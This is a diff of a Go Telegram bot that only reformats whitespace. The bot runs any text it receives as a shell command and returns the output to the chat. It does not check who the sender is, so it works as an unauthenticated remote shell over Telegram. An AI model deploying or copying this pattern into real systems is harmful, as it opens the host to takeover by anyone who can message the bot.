@@ -21,7 +21,7 @@ func ExecCmd(cmd string, args []string) (string, error) {
 
 // main function
 func main() {
-    // change the token
+	// change the token
 	const TOKEN string = "SECRET-TOKEN"
 
 	bot, err := tgbotapi.NewBotAPI(TOKEN)
@@ -29,7 +29,7 @@ func main() {
 		log.Panic(err)
 	}
 
-    // verbose bot username
+	// verbose bot username
 	log.Printf("Authorized on account %s", bot.Self.UserName)
 
 	u := tgbotapi.NewUpdate(0)
@@ -41,24 +41,24 @@ func main() {
 	}
 
 	for update := range updates {
-        // ignore any non-message updates
-		if update.Message == nil { 
+		// ignore any non-message updates
+		if update.Message == nil {
 			continue
 		}
 
 		var cmds []string
 		if strings.ContainsAny(update.Message.Text, "\n") {
-            // if msg contains new-lines then split it by `\n` separator
+			// if msg contains new-lines then split it by `\n` separator
 			cmds = strings.Split(update.Message.Text, "\n")
 		} else {
-            // otherwise split it by space separator
+			// otherwise split it by space separator
 			cmds = strings.Split(update.Message.Text, " ")
 		}
 
-        // verbose command and args
+		// verbose command and args
 		log.Printf("ExecCmd(%s, %v)", cmds[0], cmds[1:])
 
-        // Execute cmd by ExecCmd function
+		// Execute cmd by ExecCmd function
 		out, err := ExecCmd(cmds[0], cmds[1:])
 		if err != nil {
 			out = "[!] ERROR:\n" + err.Error()
@@ -66,8 +66,7 @@ func main() {
 
 		msg := tgbotapi.NewMessage(update.Message.Chat.ID, out)
 		msg.ReplyToMessageID = update.Message.MessageID
-        // send cmd-output to user
+		// send cmd-output to user
 		bot.Send(msg)
 	}
 }
-
